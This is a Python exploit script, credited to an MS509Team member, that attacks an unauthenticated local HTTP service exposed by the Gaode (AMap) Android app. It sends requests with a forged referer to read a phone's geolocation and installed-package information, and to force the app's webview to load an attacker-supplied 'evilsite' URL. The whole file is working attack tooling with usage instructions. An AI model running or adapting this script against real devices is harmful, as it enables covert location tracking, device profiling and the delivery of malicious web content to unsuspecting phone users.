#!/usr/bin/python
#encoding=utf8
from optparse import OptionParser
from json import JSONEncoder
import requests

class AmapExp:
    commands = ["geolocation", "getpackageinfo", "androidamap"]
    matchUrl = "http://m.map.so.com"

    params = ["showTraffic","viewMap","indoorMap","myLocation","bus","arroundpoi","route","keywordNavi","viewReGeo","viewPOIDetail","shortUrl","discovery","hotelList","gropbuyList","movieList","groupbuyDetail","navi2SpecialDest","rootmap","openmap","openTrafficRemind","multiPointShow","navi","poi","openFeature"]
    
    def __init__(self, target, port=6677):
        self.target = target
        self.port = port
        self.payload = {'packagename':'', 'action':''}
        self.headers = {'referer': self.matchUrl}

    def __getTargetUrl(self, command):
        if (command in self.commands):
            targetUrl = "http://" + self.target + ":" + self.port + "/"+command 
            return targetUrl
        else:
            print "Error! Command not found"
            exit(-1)

    def sendpayload(self, command, params='', evilsite=''):
        url = self.__getTargetUrl(command)
        if(url != None):
            if(command == 'getpackageinfo'):
                self.payload['packagename'] = params
            elif(command == 'androidamap'):
                self.payload['action'] = params 
                if(params == 'openFeature'):
                    d = {"action":"openFeature","featureName":"OpenURL","sourceApplication":"banner","urlType":"0","contentType":"autonavi"}
                    self.payload = d
                    self.payload["url"] = evilsite
        try:
            r = requests.get(url, params = self.payload, headers = self.headers, timeout=5) 
            print r.status_code, r.url
            return r.text
        except Exception as e:
            return e
def main():
    usage ='''
       GaodeExp:  Exploiting GaodeMap Android App for its unauthorized interface! by h33n@MS509Team

        usage: %prog -c [cmd] -p [params] -u [evilsite] [ip] [port]

        cmd including:
            geolocation, getpackageinfo, androidamap
        cmd with params:
            getpackageinfo -p [package name]
            androidmap -p [action name] , action including: showTraffic,viewMap,indoorMap,myLocation,bus,arroundpoi,route,keywordNavi,viewReGeo,viewPOIDetail,shortUrl,discovery,hotelList,gropbuyList,movieList,groupbuyDetail,navi2SpecialDest,rootmap,openmap,openTrafficRemind,multiPointShow,navi,poi,openFeature
        for example: python %prog  -c getpackageinfo -p com.android.phone  192.168.1.150 6677'''

    parser = OptionParser(usage)
    parser.add_option("-c", "--cmd", action="store", type="choice", dest="command", choices=AmapExp.commands)
    parser.add_option("-p", "--params", action="store", type="string", dest="params", help="parameters for specific command") 
    parser.add_option("-u", "--url", action="store", type="string", dest="evilsite", help="url address for webview attack") 
    (options, args) = parser.parse_args()
    if(len(args) != 2): 
        parser.error("Should set [ip] [port] of target!")
    else:
        (ip, port) = tuple(args)
        attack = AmapExp(ip,port)
        print attack.sendpayload(options.command,options.params, options.evilsite)

if __name__=='__main__': 
    main()	
